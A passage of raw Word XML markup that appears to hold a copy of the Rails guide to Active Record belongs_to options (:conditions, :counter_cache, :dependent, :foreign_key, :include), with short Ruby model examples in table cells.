          <w:p w14:paraId="66B3F9EA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="635AA3A5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2744EAC7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you specify the conditions that the associated object must meet (in the syntax used by an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>WHERE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6504"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="685B8E8A" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19EF951C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17380B39" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  belongs_to :customer, </w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:conditions</w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "active = 1"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C133816" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B782937" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD1D7BA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_cache</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option can be used to make finding the number of belonging objects more efficient. Consider these models:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="35E955D8" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C4DF5FA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05E257F5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57550747" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74050E40" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="010096D4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EA6F3F2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="538F1706" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With these declarations, asking for the value of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@customer.orders.size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requires making a call to the database to perform a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>COUNT(*)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> query. To avoid this call, you can add a counter cache to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>belonging</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5904"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3828E7E2" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3373115B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="606D912B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="007B2BED" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  belongs_to :customer, </w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:counter_cache</w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="666718E7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C33408B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="753FDA2D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DA1EDB4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1454AC9C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this declaration, Rails will keep the cache value up to date, and then return that value in response to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6E988B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Although the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_cache</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option is specified on the model that includes the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration, the actual column must be added to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>associated</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model. In the case above, you would need to add a column named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>orders_count</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model. You can override the default column name if you need to:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3C5961E9" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20DEC4FF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D381C77" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer, :counter_cache</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :count_of_orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CA8D30E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43B5810D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="252495B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07900D42" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C0E05AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Counter cache columns are added to the containing model’s list of read-only attributes through </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_readonly</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FCBC7A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD76D1D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will call the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method on the associated object to delete that object. If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:delete</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will delete the associated object </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>without</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> calling its </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0581AE61" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You should not specify this option on a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association that is connected with a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association on the other class. Doing so can lead to orphaned records in your database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0B8598" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6411078F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By convention, Rails assumes that the column used to hold the foreign key on this model is the name of the association with the suffix </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> added. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you set the name of the foreign key directly:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6144"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="72A8F2FC" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C5BF600" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EF96445" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Patron",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70889816" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "patron_id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="433F68EC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="567E91CD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In any case, Rails will not create foreign key columns for you. You need to explicitly define them as part of your migrations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AC40CF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3F2F25" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to specify second-order associations that should be eager-loaded when this association is used. For example, consider these models:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="238C6BBC" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42009880" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LineItem &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BE73C4B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :order</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6100E242" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79F4F615" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45918A5A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
